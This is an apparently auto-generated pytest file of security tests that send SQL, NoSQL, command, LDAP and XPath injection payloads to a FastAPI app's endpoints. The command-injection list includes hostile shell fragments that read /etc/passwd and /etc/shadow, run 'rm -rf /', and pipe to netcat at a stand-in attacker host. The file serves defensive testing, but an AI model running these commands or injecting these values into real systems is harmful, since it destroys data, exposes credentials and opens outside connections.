"""
Injection attack security tests
Auto-generated by CC02 v38.0 Test Automation System
"""

import pytest
from fastapi.testclient import TestClient

from app.main import app


@pytest.fixture
def client():
    return TestClient(app)


class TestInjectionSecurity:
    """Security tests for injection attacks"""

    def test_sql_injection_prevention(self, client):
        """Test SQL injection prevention"""
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' OR 1=1 --",
            "admin'--",
            "' OR 'a'='a",
            "1' OR '1'='1' /*",
        ]

        # Test SQL injection in various parameter contexts
        for payload in sql_injection_payloads:
            # Test in query parameters
            response = client.get(f"/api/v1/users?search={payload}")
            assert response.status_code in [200, 400, 404]  # Should not crash

            # Test in request body
            response = client.post("/api/v1/users", json={"name": payload})
            assert response.status_code in [200, 400, 422, 404]

            # Test in path parameters
            response = client.get(f"/api/v1/users/{payload}")
            assert response.status_code in [200, 400, 404, 422]

    def test_nosql_injection_prevention(self, client):
        """Test NoSQL injection prevention"""
        nosql_payloads = [
            {"$gt": ""},
            {"$ne": None},
            {"$regex": ".*"},
            {"$where": "function() { return true; }"},
            {"$exists": True},
        ]

        for payload in nosql_payloads:
            response = client.post("/api/v1/search", json={"query": payload})
            assert response.status_code in [200, 400, 422, 404]

    def test_command_injection_prevention(self, client):
        """Test command injection prevention"""
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "&& rm -rf /",
            "; cat /etc/shadow",
            "| nc attacker.com 4444",
        ]

        for payload in command_injection_payloads:
            response = client.post("/api/v1/process", json={"command": payload})
            assert response.status_code in [200, 400, 422, 404]

    def test_ldap_injection_prevention(self, client):
        """Test LDAP injection prevention"""
        ldap_payloads = [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "admin)(&(password=*))",
            "*))%00",
            "*)((|userPassword=*))",
        ]

        for payload in ldap_payloads:
            response = client.post("/api/v1/ldap-search", json={"filter": payload})
            assert response.status_code in [200, 400, 422, 404]

    def test_xpath_injection_prevention(self, client):
        """Test XPath injection prevention"""
        xpath_payloads = [
            "' or '1'='1",
            "'] | //user/*[contains(*,'admin')] | //user['",
            "' or 1=1 or ''='",
            "x'] | //password | //user['",
            "'] | //node() | //user['",
        ]

        for payload in xpath_payloads:
            response = client.post("/api/v1/xml-search", json={"xpath": payload})
            assert response.status_code in [200, 400, 422, 404]
